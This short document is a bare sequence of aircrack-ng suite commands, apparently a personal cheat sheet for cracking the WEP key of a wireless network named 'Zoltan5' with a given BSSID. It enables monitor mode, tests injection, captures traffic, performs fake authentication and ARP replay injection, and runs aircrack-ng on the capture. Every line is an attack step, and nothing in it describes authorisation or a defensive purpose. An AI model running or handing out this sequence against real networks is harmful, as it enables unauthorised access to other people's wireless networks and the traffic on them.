airmon-ng start wlan0
airserv-ng -d mon0
aireplay-ng -9 127.0.0.1:666

airodump-ng mon0

airodump-ng mon0 -c 2

aireplay-ng --test Zoltan5 -a 00:17:7C:22:CB:80 mon0

airodump-ng -c 2 --bssid Zoltan5 00:17:7C:22:CB:80 -w dump mon0

aireplay-ng -1 0 -e Zoltan5 -a 00:17:7C:22:CB:80 mon0

aireplay-ng -3 -b 00:17:7C:22:CB:80 mon0

aircrack-ng dump-01.cap
